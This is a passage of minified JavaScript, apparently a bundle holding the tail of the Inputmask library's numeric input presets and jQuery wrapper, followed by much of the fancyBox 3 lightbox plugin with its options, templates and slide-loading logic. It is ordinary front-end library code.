                        var o = e.split("."),
                            r = "" !== n.groupSeparator ? parseInt(n.groupSize) : 0;
                        2 === o.length && (o[0].length > r || o[1].length > r || o[0].length <= r && o[1].length < r) && (e = e.replace(".", n.radixPoint))
                    }
                    var s = e.match(/,/g),
                        a = e.match(/\./g);
                    if (e = a && s ? a.length > s.length ? (e = e.replace(/\./g, "")).replace(",", n.radixPoint) : s.length > a.length ? (e = e.replace(/,/g, "")).replace(".", n.radixPoint) : e.indexOf(".") < e.indexOf(",") ? e.replace(/\./g, "") : e.replace(/,/g, "") : e.replace(new RegExp(t.escapeRegex(n.groupSeparator), "g"), ""), 0 === n.digits && (-1 !== e.indexOf(".") ? e = e.substring(0, e.indexOf(".")) : -1 !== e.indexOf(",") && (e = e.substring(0, e.indexOf(",")))), "" !== n.radixPoint && isFinite(n.digits) && -1 !== e.indexOf(n.radixPoint)) {
                        var l = e.split(n.radixPoint)[1].match(new RegExp("\\d*"))[0];
                        if (parseInt(n.digits) < l.toString().length) {
                            var c = Math.pow(10, parseInt(n.digits));
                            e = e.replace(t.escapeRegex(n.radixPoint), "."), e = (e = Math.round(parseFloat(e) * c) / c).toString().replace(".", n.radixPoint)
                        }
                    }
                    return i(e.toString().split(""), n).join("")
                },
                onKeyDown: function(n, i, o, r) {
                    var s = e(this);
                    if (n.ctrlKey) switch (n.keyCode) {
                        case t.keyCode.UP:
                            s.val(parseFloat(this.inputmask.unmaskedvalue()) + parseInt(r.step)), s.trigger("setvalue");
                            break;
                        case t.keyCode.DOWN:
                            s.val(parseFloat(this.inputmask.unmaskedvalue()) - parseInt(r.step)), s.trigger("setvalue")
                    }
                }
            },
            currency: {
                prefix: "$ ",
                groupSeparator: ",",
                alias: "numeric",
                placeholder: "0",
                autoGroup: !0,
                digits: 2,
                digitsOptional: !1,
                clearMaskOnLostFocus: !1
            },
            decimal: {
                alias: "numeric"
            },
            integer: {
                alias: "numeric",
                digits: 0,
                radixPoint: ""
            },
            percentage: {
                alias: "numeric",
                digits: 2,
                digitsOptional: !0,
                radixPoint: ".",
                placeholder: "0",
                autoGroup: !1,
                min: 0,
                max: 100,
                suffix: " %",
                allowMinus: !1
            }
        }), t
    }) ? i.apply(e, o) : i) || (t.exports = r)
}, function(t, e, n) {
    "use strict";
    var i, o, r, s = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
        return typeof t
    } : function(t) {
        return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
    };
    o = [n(4), n(2)], void 0 === (r = "function" == typeof(i = function(t, e) {
        return void 0 === t.fn.inputmask && (t.fn.inputmask = function(n, i) {
            var o, r = this[0];
            if (void 0 === i && (i = {}), "string" == typeof n) switch (n) {
                case "unmaskedvalue":
                    return r && r.inputmask ? r.inputmask.unmaskedvalue() : t(r).val();
                case "remove":
                    return this.each((function() {
                        this.inputmask && this.inputmask.remove()
                    }));
                case "getemptymask":
                    return r && r.inputmask ? r.inputmask.getemptymask() : "";
                case "hasMaskedValue":
                    return !(!r || !r.inputmask) && r.inputmask.hasMaskedValue();
                case "isComplete":
                    return !r || !r.inputmask || r.inputmask.isComplete();
                case "getmetadata":
                    return r && r.inputmask ? r.inputmask.getmetadata() : void 0;
                case "setvalue":
                    e.setValue(r, i);
                    break;
                case "option":
                    if ("string" != typeof i) return this.each((function() {
                        if (void 0 !== this.inputmask) return this.inputmask.option(i)
                    }));
                    if (r && void 0 !== r.inputmask) return r.inputmask.option(i);
                    break;
                default:
                    return i.alias = n, o = new e(i), this.each((function() {
                        o.mask(this)
                    }))
            } else {
                if (Array.isArray(n)) return i.alias = n, o = new e(i), this.each((function() {
                    o.mask(this)
                }));
                if ("object" == (void 0 === n ? "undefined" : s(n))) return o = new e(n), void 0 === n.mask && void 0 === n.alias ? this.each((function() {
                    if (void 0 !== this.inputmask) return this.inputmask.option(n);
                    o.mask(this)
                })) : this.each((function() {
                    o.mask(this)
                }));
                if (void 0 === n) return this.each((function() {
                    (o = new e(i)).mask(this)
                }))
            }
        }), t.fn.inputmask
    }) ? i.apply(e, o) : i) || (t.exports = r)
}]),
function(t, e, n, i) {
    "use strict";

    function o(t) {
        var e = n(t.currentTarget),
            i = t.data ? t.data.options : {},
            o = e.attr("data-fancybox") || "",
            r = 0,
            s = [];
        t.isDefaultPrevented() || (t.preventDefault(), o ? (r = (s = (s = i.selector ? n(i.selector) : t.data ? t.data.items : []).length ? s.filter('[data-fancybox="' + o + '"]') : n('[data-fancybox="' + o + '"]')).index(e)) < 0 && (r = 0) : s = [e], n.fancybox.open(s, i, r))
    }
    if (n) {
        if (n.fn.fancybox) return void("console" in t && console.log("fancyBox already initialized"));
        var r = {
                loop: !1,
                margin: [44, 0],
                gutter: 50,
                keyboard: !0,
                arrows: !0,
                infobar: !0,
                toolbar: !0,
                buttons: ["slideShow", "fullScreen", "thumbs", "share", "close"],
                idleTime: 3,
                smallBtn: "auto",
                protect: !1,
                modal: !1,
                image: {
                    preload: "auto"
                },
                ajax: {
                    settings: {
                        data: {
                            fancybox: !0
                        }
                    }
                },
                iframe: {
                    tpl: '<iframe id="fancybox-frame{rnd}" name="fancybox-frame{rnd}" class="fancybox-iframe" frameborder="0" vspace="0" hspace="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen allowtransparency="true" src=""></iframe>',
                    preload: !0,
                    css: {},
                    attr: {
                        scrolling: "auto"
                    }
                },
                defaultType: "image",
                animationEffect: "zoom",
                animationDuration: 500,
                zoomOpacity: "auto",
                transitionEffect: "fade",
                transitionDuration: 366,
                slideClass: "",
                baseClass: "",
                baseTpl: '<div class="fancybox-container" role="dialog" tabindex="-1"><div class="fancybox-bg"></div><div class="fancybox-inner"><div class="fancybox-infobar"><span data-fancybox-index></span>&nbsp;/&nbsp;<span data-fancybox-count></span></div><div class="fancybox-toolbar">{{buttons}}</div><div class="fancybox-navigation">{{arrows}}</div><div class="fancybox-stage"></div><div class="fancybox-caption-wrap"><div class="fancybox-caption"></div></div></div></div>',
                spinnerTpl: '<div class="fancybox-loading"></div>',
                errorTpl: '<div class="fancybox-error"><p>{{ERROR}}<p></div>',
                btnTpl: {
                    download: '<a download data-fancybox-download class="fancybox-button fancybox-button--download" title="{{DOWNLOAD}}"><svg viewBox="0 0 40 40"><path d="M20,23 L20,8 L20,23 L13,16 L20,23 L27,16 L20,23 M26,28 L13,28 L27,28 L14,28" /></svg></a>',
                    zoom: '<button data-fancybox-zoom class="fancybox-button fancybox-button--zoom" title="{{ZOOM}}"><svg viewBox="0 0 40 40"><path d="M 18,17 m-8,0 a 8,8 0 1,0 16,0 a 8,8 0 1,0 -16,0 M25,23 L31,29 L25,23" /></svg></button>',
                    close: '<button data-fancybox-close class="fancybox-button fancybox-button--close" title="{{CLOSE}}"><svg viewBox="0 0 40 40"><path d="M10,10 L30,30 M30,10 L10,30" /></svg></button>',
                    smallBtn: '<button data-fancybox-close class="fancybox-close-small" title="{{CLOSE}}"></button>',
                    arrowLeft: '<button data-fancybox-prev class="fancybox-button fancybox-button--arrow_left" title="{{PREV}}"><svg viewBox="0 0 40 40"><path d="M10,20 L30,20 L10,20 L18,28 L10,20 L18,12 L10,20"></path></svg></button>',
                    arrowRight: '<button data-fancybox-next class="fancybox-button fancybox-button--arrow_right" title="{{NEXT}}"><svg viewBox="0 0 40 40"><path d="M30,20 L10,20 L30,20 L22,28 L30,20 L22,12 L30,20"></path></svg></button>'
                },
                parentEl: "body",
                autoFocus: !1,
                backFocus: !0,
                trapFocus: !0,
                fullScreen: {
                    autoStart: !1
                },
                touch: {
                    vertical: !0,
                    momentum: !0
                },
                hash: null,
                media: {},
                slideShow: {
                    autoStart: !1,
                    speed: 4e3
                },
                thumbs: {
                    autoStart: !1,
                    hideOnClose: !0,
                    parentEl: ".fancybox-container",
                    axis: "y"
                },
                onInit: n.noop,
                beforeLoad: n.noop,
                afterLoad: n.noop,
                beforeShow: n.noop,
                afterShow: n.noop,
                beforeClose: n.noop,
                afterClose: n.noop,
                onActivate: n.noop,
                onDeactivate: n.noop,
                clickContent: function(t, e) {
                    return "image" === t.type && "zoom"
                },
                clickSlide: "close",
                clickOutside: "close",
                dblclickContent: !1,
                dblclickSlide: !1,
                dblclickOutside: !1,
                mobile: {
                    margin: 0,
                    clickContent: function(t, e) {
                        return "image" === t.type && "toggleControls"
                    },
                    clickSlide: function(t, e) {
                        return "image" === t.type ? "toggleControls" : "close"
                    },
                    dblclickContent: function(t, e) {
                        return "image" === t.type && "zoom"
                    },
                    dblclickSlide: function(t, e) {
                        return "image" === t.type && "zoom"
                    }
                },
                lang: "en",
                i18n: {
                    en: {
                        CLOSE: "Close",
                        NEXT: "Next",
                        PREV: "Previous",
                        ERROR: "The requested content cannot be loaded. <br/> Please try again later.",
                        PLAY_START: "Start slideshow",
                        PLAY_STOP: "Pause slideshow",
                        FULL_SCREEN: "Full screen",
                        THUMBS: "Thumbnails",
                        DOWNLOAD: "Download",
                        SHARE: "Share",
                        ZOOM: "Zoom"
                    },
                    de: {
                        CLOSE: "Schliessen",
                        NEXT: "Weiter",
                        PREV: "Zurück",
                        ERROR: "Die angeforderten Daten konnten nicht geladen werden. <br/> Bitte versuchen Sie es später nochmal.",
                        PLAY_START: "Diaschau starten",
                        PLAY_STOP: "Diaschau beenden",
                        FULL_SCREEN: "Vollbild",
                        THUMBS: "Vorschaubilder",
                        DOWNLOAD: "Herunterladen",
                        SHARE: "Teilen",
                        ZOOM: "Maßstab"
                    }
                }
            },
            s = n(t),
            a = n(e),
            l = 0,
            c = t.requestAnimationFrame || t.webkitRequestAnimationFrame || t.mozRequestAnimationFrame || t.oRequestAnimationFrame || function(e) {
                return t.setTimeout(e, 1e3 / 60)
            },
            u = function() {
                var t, n = e.createElement("fakeelement"),
                    o = {
                        transition: "transitionend",
                        OTransition: "oTransitionEnd",
                        MozTransition: "transitionend",
                        WebkitTransition: "webkitTransitionEnd"
                    };
                for (t in o)
                    if (n.style[t] !== i) return o[t];
                return "transitionend"
            }(),
            p = function(t) {
                return t && t.length && t[0].offsetHeight
            },
            h = function(t, i, o) {
                var r = this;
                r.opts = n.extend(!0, {
                    index: o
                }, n.fancybox.defaults, i || {}), n.fancybox.isMobile && (r.opts = n.extend(!0, {}, r.opts, r.opts.mobile)), i && n.isArray(i.buttons) && (r.opts.buttons = i.buttons), r.id = r.opts.id || ++l, r.group = [], r.currIndex = parseInt(r.opts.index, 10) || 0, r.prevIndex = null, r.prevPos = null, r.currPos = 0, r.firstRun = null, r.createGroup(t), r.group.length && (r.$lastFocus = n(e.activeElement).blur(), r.slides = {}, r.init())
            };
        n.extend(h.prototype, {
            init: function() {
                var o, r, s, l = this,
                    c = l.group[l.currIndex],
                    u = c.opts,
                    p = n.fancybox.scrollbarWidth;
                l.scrollTop = a.scrollTop(), l.scrollLeft = a.scrollLeft(), n.fancybox.getInstance() || (n("body").addClass("fancybox-active"), /iPad|iPhone|iPod/.test(navigator.userAgent) && !t.MSStream ? "image" !== c.type && n("body").css("top", -1 * n("body").scrollTop()).addClass("fancybox-iosfix") : !n.fancybox.isMobile && e.body.scrollHeight > t.innerHeight && (p === i && (o = n('<div style="width:50px;height:50px;overflow:scroll;" />').appendTo("body"), p = n.fancybox.scrollbarWidth = o[0].offsetWidth - o[0].clientWidth, o.remove()), n("head").append('<style id="fancybox-style-noscroll" type="text/css">.compensate-for-scrollbar { margin-right: ' + p + "px; }</style>"), n("body").addClass("compensate-for-scrollbar"))), s = "", n.each(u.buttons, (function(t, e) {
                    s += u.btnTpl[e] || ""
                })), r = n(l.translate(l, u.baseTpl.replace("{{buttons}}", s).replace("{{arrows}}", u.btnTpl.arrowLeft + u.btnTpl.arrowRight))).attr("id", "fancybox-container-" + l.id).addClass("fancybox-is-hidden").addClass(u.baseClass).data("FancyBox", l).appendTo(u.parentEl), l.$refs = {
                    container: r
                }, ["bg", "inner", "infobar", "toolbar", "stage", "caption", "navigation"].forEach((function(t) {
                    l.$refs[t] = r.find(".fancybox-" + t)
                })), l.trigger("onInit"), l.activate(), l.jumpTo(l.currIndex)
            },
            translate: function(t, e) {
                var n = t.opts.i18n[t.opts.lang];
                return e.replace(/\{\{(\w+)\}\}/g, (function(t, e) {
                    var o = n[e];
                    return o === i ? t : o
                }))
            },
            createGroup: function(t) {
                var e = this,
                    o = n.makeArray(t);
                n.each(o, (function(t, o) {
                    var r, s, a, l, c = {},
                        u = {};
                    n.isPlainObject(o) ? (c = o, u = o.opts || o) : "object" === n.type(o) && n(o).length ? (u = (r = n(o)).data(), (u = n.extend({}, u, u.options || {})).$orig = r, c.src = u.src || r.attr("href"), c.type || c.src || (c.type = "inline", c.src = o)) : c = {
                        type: "html",
                        src: o + ""
                    }, c.opts = n.extend(!0, {}, e.opts, u), n.isArray(u.buttons) && (c.opts.buttons = u.buttons), s = c.type || c.opts.type, a = c.src || "", !s && a && (a.match(/(^data:image\/[a-z0-9+\/=]*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp|svg|ico)((\?|#).*)?$)/i) ? s = "image" : a.match(/\.(pdf)((\?|#).*)?$/i) ? s = "pdf" : "#" === a.charAt(0) && (s = "inline")), s ? c.type = s : e.trigger("objectNeedsType", c), c.index = e.group.length, c.opts.$orig && !c.opts.$orig.length && delete c.opts.$orig, !c.opts.$thumb && c.opts.$orig && (c.opts.$thumb = c.opts.$orig.find("img:first")), c.opts.$thumb && !c.opts.$thumb.length && delete c.opts.$thumb, "function" === n.type(c.opts.caption) && (c.opts.caption = c.opts.caption.apply(o, [e, c])), "function" === n.type(e.opts.caption) && (c.opts.caption = e.opts.caption.apply(o, [e, c])), c.opts.caption instanceof n || (c.opts.caption = c.opts.caption === i ? "" : c.opts.caption + ""), "ajax" === s && ((l = a.split(/\s+/, 2)).length > 1 && (c.src = l.shift(), c.opts.filter = l.shift())), "auto" == c.opts.smallBtn && (n.inArray(s, ["html", "inline", "ajax"]) > -1 ? (c.opts.toolbar = !1, c.opts.smallBtn = !0) : c.opts.smallBtn = !1), "pdf" === s && (c.type = "iframe", c.opts.iframe.preload = !1), c.opts.modal && (c.opts = n.extend(!0, c.opts, {
                        infobar: 0,
                        toolbar: 0,
                        smallBtn: 0,
                        keyboard: 0,
                        slideShow: 0,
                        fullScreen: 0,
                        thumbs: 0,
                        touch: 0,
                        clickContent: !1,
                        clickSlide: !1,
                        clickOutside: !1,
                        dblclickContent: !1,
                        dblclickSlide: !1,
                        dblclickOutside: !1
                    })), e.group.push(c)
                }))
            },
            addEvents: function() {
                var i = this;
                i.removeEvents(), i.$refs.container.on("click.fb-close", "[data-fancybox-close]", (function(t) {
                    t.stopPropagation(), t.preventDefault(), i.close(t)
                })).on("click.fb-prev touchend.fb-prev", "[data-fancybox-prev]", (function(t) {
                    t.stopPropagation(), t.preventDefault(), i.previous()
                })).on("click.fb-next touchend.fb-next", "[data-fancybox-next]", (function(t) {
                    t.stopPropagation(), t.preventDefault(), i.next()
                })).on("click.fb", "[data-fancybox-zoom]", (function(t) {
                    i[i.isScaledDown() ? "scaleToActual" : "scaleToFit"]()
                })), s.on("orientationchange.fb resize.fb", (function(t) {
                    t && t.originalEvent && "resize" === t.originalEvent.type ? c((function() {
                        i.update()
                    })) : (i.$refs.stage.hide(), setTimeout((function() {
                        i.$refs.stage.show(), i.update()
                    }), 600))
                })), a.on("focusin.fb", (function(t) {
                    var o = n.fancybox ? n.fancybox.getInstance() : null;
                    o.isClosing || !o.current || !o.current.opts.trapFocus || n(t.target).hasClass("fancybox-container") || n(t.target).is(e) || o && "fixed" !== n(t.target).css("position") && !o.$refs.container.has(t.target).length && (t.stopPropagation(), o.focus(), s.scrollTop(i.scrollTop).scrollLeft(i.scrollLeft))
                })), a.on("keydown.fb", (function(t) {
                    var e = i.current,
                        o = t.keyCode || t.which;
                    if (e && e.opts.keyboard && !n(t.target).is("input") && !n(t.target).is("textarea")) return 8 === o || 27 === o ? (t.preventDefault(), void i.close(t)) : 37 === o || 38 === o ? (t.preventDefault(), void i.previous()) : 39 === o || 40 === o ? (t.preventDefault(), void i.next()) : void i.trigger("afterKeydown", t, o)
                })), i.group[i.currIndex].opts.idleTime && (i.idleSecondsCounter = 0, a.on("mousemove.fb-idle mouseleave.fb-idle mousedown.fb-idle touchstart.fb-idle touchmove.fb-idle scroll.fb-idle keydown.fb-idle", (function(t) {
                    i.idleSecondsCounter = 0, i.isIdle && i.showControls(), i.isIdle = !1
                })), i.idleInterval = t.setInterval((function() {
                    i.idleSecondsCounter++, i.idleSecondsCounter >= i.group[i.currIndex].opts.idleTime && (i.isIdle = !0, i.idleSecondsCounter = 0, i.hideControls())
                }), 1e3))
            },
            removeEvents: function() {
                var e = this;
                s.off("orientationchange.fb resize.fb"), a.off("focusin.fb keydown.fb .fb-idle"), this.$refs.container.off(".fb-close .fb-prev .fb-next"), e.idleInterval && (t.clearInterval(e.idleInterval), e.idleInterval = null)
            },
            previous: function(t) {
                return this.jumpTo(this.currPos - 1, t)
            },
            next: function(t) {
                return this.jumpTo(this.currPos + 1, t)
            },
            jumpTo: function(t, e, o) {
                var r, s, a, l, c, u, h, d = this,
                    f = d.group.length;
                if (!(d.isSliding || d.isClosing || d.isAnimating && d.firstRun)) {
                    if (t = parseInt(t, 10), !(s = d.current ? d.current.opts.loop : d.opts.loop) && (t < 0 || t >= f)) return !1;
                    if (r = d.firstRun = null === d.firstRun, !(f < 2 && !r && d.isSliding)) {
                        if (l = d.current, d.prevIndex = d.currIndex, d.prevPos = d.currPos, a = d.createSlide(t), f > 1 && ((s || a.index > 0) && d.createSlide(t - 1), (s || a.index < f - 1) && d.createSlide(t + 1)), d.current = a, d.currIndex = a.index, d.currPos = a.pos, d.trigger("beforeShow", r), d.updateControls(), u = n.fancybox.getTranslate(a.$slide), a.isMoved = (0 !== u.left || 0 !== u.top) && !a.$slide.hasClass("fancybox-animated"), a.forcedDuration = i, n.isNumeric(e) ? a.forcedDuration = e : e = a.opts[r ? "animationDuration" : "transitionDuration"], e = parseInt(e, 10), r) return a.opts.animationEffect && e && d.$refs.container.css("transition-duration", e + "ms"), d.$refs.container.removeClass("fancybox-is-hidden"), p(d.$refs.container), d.$refs.container.addClass("fancybox-is-open"), a.$slide.addClass("fancybox-slide--current"), d.loadSlide(a), void d.preload();
                        n.each(d.slides, (function(t, e) {
                            n.fancybox.stop(e.$slide)
                        })), a.$slide.removeClass("fancybox-slide--next fancybox-slide--previous").addClass("fancybox-slide--current"), a.isMoved ? (c = Math.round(a.$slide.width()), n.each(d.slides, (function(t, i) {
                            var o = i.pos - a.pos;
                            n.fancybox.animate(i.$slide, {
                                top: 0,
                                left: o * c + o * i.opts.gutter
                            }, e, (function() {
                                i.$slide.removeAttr("style").removeClass("fancybox-slide--next fancybox-slide--previous"), i.pos === d.currPos && (a.isMoved = !1, d.complete())
                            }))
                        }))) : d.$refs.stage.children().removeAttr("style"), a.isLoaded ? d.revealContent(a) : d.loadSlide(a), d.preload(), l.pos !== a.pos && (h = "fancybox-slide--" + (l.pos > a.pos ? "next" : "previous"), l.$slide.removeClass("fancybox-slide--complete fancybox-slide--current fancybox-slide--next fancybox-slide--previous"), l.isComplete = !1, e && (a.isMoved || a.opts.transitionEffect) && (a.isMoved ? l.$slide.addClass(h) : (h = "fancybox-animated " + h + " fancybox-fx-" + a.opts.transitionEffect, n.fancybox.animate(l.$slide, h, e, (function() {
                            l.$slide.removeClass(h).removeAttr("style")
                        })))))
                    }
                }
            },
            createSlide: function(t) {
                var e, i, o = this;
                return i = (i = t % o.group.length) < 0 ? o.group.length + i : i, !o.slides[t] && o.group[i] && (e = n('<div class="fancybox-slide"></div>').appendTo(o.$refs.stage), o.slides[t] = n.extend(!0, {}, o.group[i], {
                    pos: t,
                    $slide: e,
                    isLoaded: !1
                }), o.updateSlide(o.slides[t])), o.slides[t]
            },
            scaleToActual: function(t, e, o) {
                var r, s, a, l, c, u = this,
                    p = u.current,
                    h = p.$content,
                    d = parseInt(p.$slide.width(), 10),
                    f = parseInt(p.$slide.height(), 10),
                    m = p.width,
                    g = p.height;
                "image" != p.type || p.hasError || !h || u.isAnimating || (n.fancybox.stop(h), u.isAnimating = !0, t = t === i ? .5 * d : t, e = e === i ? .5 * f : e, l = m / (r = n.fancybox.getTranslate(h)).width, c = g / r.height, s = .5 * d - .5 * m, a = .5 * f - .5 * g, m > d && ((s = r.left * l - (t * l - t)) > 0 && (s = 0), s < d - m && (s = d - m)), g > f && ((a = r.top * c - (e * c - e)) > 0 && (a = 0), a < f - g && (a = f - g)), u.updateCursor(m, g), n.fancybox.animate(h, {
                    top: a,
                    left: s,
                    scaleX: l,
                    scaleY: c
                }, o || 330, (function() {
                    u.isAnimating = !1
                })), u.SlideShow && u.SlideShow.isActive && u.SlideShow.stop())
            },
            scaleToFit: function(t) {
                var e, i = this,
                    o = i.current,
                    r = o.$content;
                "image" != o.type || o.hasError || !r || i.isAnimating || (n.fancybox.stop(r), i.isAnimating = !0, e = i.getFitPos(o), i.updateCursor(e.width, e.height), n.fancybox.animate(r, {
                    top: e.top,
                    left: e.left,
                    scaleX: e.width / r.width(),
                    scaleY: e.height / r.height()
                }, t || 330, (function() {
                    i.isAnimating = !1
                })))
            },
            getFitPos: function(t) {
                var e, i, o, r, s, a = t.$content,
                    l = t.width,
                    c = t.height,
                    u = t.opts.margin;
                return !(!a || !a.length || !l && !c) && ("number" === n.type(u) && (u = [u, u]), 2 == u.length && (u = [u[0], u[1], u[0], u[1]]), e = parseInt(this.$refs.stage.width(), 10) - (u[1] + u[3]), i = parseInt(this.$refs.stage.height(), 10) - (u[0] + u[2]), o = Math.min(1, e / l, i / c), r = Math.floor(o * l), s = Math.floor(o * c), {
                    top: Math.floor(.5 * (i - s)) + u[0],
                    left: Math.floor(.5 * (e - r)) + u[3],
                    width: r,
                    height: s
                })
            },
            update: function() {
                var t = this;
                n.each(t.slides, (function(e, n) {
                    t.updateSlide(n)
                }))
            },
            updateSlide: function(t) {
                var e = this,
                    i = t.$content;
                i && (t.width || t.height) && (e.isAnimating = !1, n.fancybox.stop(i), n.fancybox.setTranslate(i, e.getFitPos(t)), t.pos === e.currPos && e.updateCursor()), t.$slide.trigger("refresh"), e.trigger("onUpdate", t)
            },
            updateCursor: function(t, e) {
                var n = this,
                    o = n.$refs.container.removeClass("fancybox-is-zoomable fancybox-can-zoomIn fancybox-can-drag fancybox-can-zoomOut");
                n.current && !n.isClosing && (n.isZoomable() ? (o.addClass("fancybox-is-zoomable"), (t !== i && e !== i ? t < n.current.width && e < n.current.height : n.isScaledDown()) ? o.addClass("fancybox-can-zoomIn") : n.current.opts.touch ? o.addClass("fancybox-can-drag") : o.addClass("fancybox-can-zoomOut")) : n.current.opts.touch && o.addClass("fancybox-can-drag"))
            },
            isZoomable: function() {
                var t, e = this,
                    i = e.current;
                if (i && !e.isClosing) return !!("image" === i.type && i.isLoaded && !i.hasError && ("zoom" === i.opts.clickContent || n.isFunction(i.opts.clickContent) && "zoom" === i.opts.clickContent(i)) && (t = e.getFitPos(i), i.width > t.width || i.height > t.height))
            },
            isScaledDown: function() {
                var t = this.current,
                    e = t.$content,
                    i = !1;
                return e && (i = (i = n.fancybox.getTranslate(e)).width < t.width || i.height < t.height), i
            },
            canPan: function() {
                var t = this.current,
                    e = t.$content,
                    n = !1;
                return e && (n = this.getFitPos(t), n = Math.abs(e.width() - n.width) > 1 || Math.abs(e.height() - n.height) > 1), n
            },
            loadSlide: function(t) {
                var e, i, o, r = this;
                if (!t.isLoading && !t.isLoaded) {
                    switch (t.isLoading = !0, r.trigger("beforeLoad", t), e = t.type, (i = t.$slide).off("refresh").trigger("onReset").addClass("fancybox-slide--" + (e || "unknown")).addClass(t.opts.slideClass), e) {
                        case "image":
                            r.setImage(t);
                            break;
                        case "iframe":
                            r.setIframe(t);
                            break;
                        case "html":
                            r.setContent(t, t.src || t.content);
                            break;
                        case "inline":
                            n(t.src).length ? r.setContent(t, n(t.src)) : r.setError(t);
                            break;
                        case "ajax":
                            r.showLoading(t), o = n.ajax(n.extend({}, t.opts.ajax.settings, {
                                url: t.src,
                                success: function(e, n) {
                                    "success" === n && r.setContent(t, e)
                                },
                                error: function(e, n) {
                                    e && "abort" !== n && r.setError(t)
                                }
                            })), i.one("onReset", (function() {
                                o.abort()
                            }));
                            break;
                        default:
                            r.setError(t)
                    }
                    return !0
                }
            },
            setImage: function(e) {
                var i, o, r, s, a = this,
                    l = e.opts.srcset || e.opts.image.srcset;
                if (l) {
                    r = t.devicePixelRatio || 1, s = t.innerWidth * r, (o = l.split(",").map((function(t) {
                        var e = {};
                        return t.trim().split(/\s+/).forEach((function(t, n) {
                            var i = parseInt(t.substring(0, t.length - 1), 10);
                            return 0 === n ? e.url = t : void(i && (e.value = i, e.postfix = t[t.length - 1]))
                        })), e
                    }))).sort((function(t, e) {
                        return t.value - e.value
                    }));
                    for (var c = 0; c < o.length; c++) {
                        var u = o[c];
                        if ("w" === u.postfix && u.value >= s || "x" === u.postfix && u.value >= r) {
                            i = u;
                            break
                        }
                    }!i && o.length && (i = o[o.length - 1]), i && (e.src = i.url, e.width && e.height && "w" == i.postfix && (e.height = e.width / e.height * i.value, e.width = i.value))
                }
                e.$content = n('<div class="fancybox-image-wrap"></div>').addClass("fancybox-is-hidden").appendTo(e.$slide), !1 !== e.opts.preload && e.opts.width && e.opts.height && (e.opts.thumb || e.opts.$thumb) ? (e.width = e.opts.width, e.height = e.opts.height, e.$ghost = n("<img />").one("error", (function() {
                    n(this).remove(), e.$ghost = null, a.setBigImage(e)
                })).one("load", (function() {
                    a.afterLoad(e), a.setBigImage(e)
                })).addClass("fancybox-image").appendTo(e.$content).attr("src", e.opts.thumb || e.opts.$thumb.attr("src"))) : a.setBigImage(e)
            },
            setBigImage: function(t) {
                var e = this,
                    i = n("<img />");
                t.$image = i.one("error", (function() {
                    e.setError(t)
                })).one("load", (function() {
                    clearTimeout(t.timouts), t.timouts = null, e.isClosing || (t.width = this.naturalWidth, t.height = this.naturalHeight, t.opts.image.srcset && i.attr("sizes", "100vw").attr("srcset", t.opts.image.srcset), e.hideLoading(t), t.$ghost ? t.timouts = setTimeout((function() {
                        t.timouts = null, t.$ghost.hide()
                    }), Math.min(300, Math.max(1e3, t.height / 1600))) : e.afterLoad(t))
                })).addClass("fancybox-image").attr("src", t.src).appendTo(t.$content), (i[0].complete || "complete" == i[0].readyState) && i[0].naturalWidth && i[0].naturalHeight ? i.trigger("load") : i[0].error ? i.trigger("error") : t.timouts = setTimeout((function() {
                    i[0].complete || t.hasError || e.showLoading(t)
                }), 100)
            },
            setIframe: function(t) {
                var e, o = this,
                    r = t.opts.iframe,
                    s = t.$slide;
                t.$content = n('<div class="fancybox-content' + (r.preload ? " fancybox-is-hidden" : "") + '"></div>').css(r.css).appendTo(s), e = n(r.tpl.replace(/\{rnd\}/g, (new Date).getTime())).attr(r.attr).appendTo(t.$content), r.preload ? (o.showLoading(t), e.on("load.fb error.fb", (function(e) {
                    this.isReady = 1, t.$slide.trigger("refresh"), o.afterLoad(t)
                })), s.on("refresh.fb", (function() {
                    var n, o, s = t.$content,
                        a = r.css.width,
                        l = r.css.height;
                    if (1 === e[0].isReady) {
                        try {
                            o = e.contents().find("body")
                        } catch (t) {}
                        o && o.length && (a === i && (n = e[0].contentWindow.document.documentElement.scrollWidth, a = Math.ceil(o.outerWidth(!0) + (s.width() - n)), a += s.outerWidth() - s.innerWidth()), l === i && (l = Math.ceil(o.outerHeight(!0)), l += s.outerHeight() - s.innerHeight()), a && s.width(a), l && s.height(l)), s.removeClass("fancybox-is-hidden")
                    }
                }))) : this.afterLoad(t), e.attr("src", t.src), !0 === t.opts.smallBtn && t.$content.prepend(o.translate(t, t.opts.btnTpl.smallBtn)), s.one("onReset", (function() {
                    try {
                        n(this).find("iframe").hide().attr("src", "//about:blank")
                    } catch (t) {}
                    n(this).empty(), t.isLoaded = !1
                }))
            },
            setContent: function(t, e) {
                this.isClosing || (this.hideLoading(t), t.$slide.empty(), function(t) {
                    return t && t.hasOwnProperty && t instanceof n
                }(e) && e.parent().length ? (e.parent(".fancybox-slide--inline").trigger("onReset"), t.$placeholder = n("<div></div>").hide().insertAfter(e), e.css("display", "inline-block")) : t.hasError || ("string" === n.type(e) && (3 === (e = n("<div>").append(n.trim(e)).contents())[0].nodeType && (e = n("<div>").html(e))), t.opts.filter && (e = n("<div>").html(e).find(t.opts.filter))), t.$slide.one("onReset", (function() {
                    t.$placeholder && (t.$placeholder.after(e.hide()).remove(), t.$placeholder = null), t.$smallBtn && (t.$smallBtn.remove(), t.$smallBtn = null), t.hasError || (n(this).empty(), t.isLoaded = !1)
                })), t.$content = n(e).appendTo(t.$slide), this.afterLoad(t))
            },
            setError: function(t) {
                t.hasError = !0, t.$slide.removeClass("fancybox-slide--" + t.type), this.setContent(t, this.translate(t, t.opts.errorTpl))
            },
            showLoading: function(t) {
                (t = t || this.current) && !t.$spinner && (t.$spinner = n(this.opts.spinnerTpl).appendTo(t.$slide))
            },
            hideLoading: function(t) {
                (t = t || this.current) && t.$spinner && (t.$spinner.remove(), delete t.$spinner)
            },
            afterLoad: function(t) {
                var e = this;
                e.isClosing || (t.isLoading = !1, t.isLoaded = !0, e.trigger("afterLoad", t), e.hideLoading(t), t.opts.smallBtn && !t.$smallBtn && (t.$smallBtn = n(e.translate(t, t.opts.btnTpl.smallBtn)).appendTo(t.$content.filter("div,form").first())), t.opts.protect && t.$content && !t.hasError && (t.$content.on("contextmenu.fb", (function(t) {
                    return 2 == t.button && t.preventDefault(), !0
                })), "image" === t.type && n('<div class="fancybox-spaceball"></div>').appendTo(t.$content)), e.revealContent(t))
            },
            revealContent: function(t) {
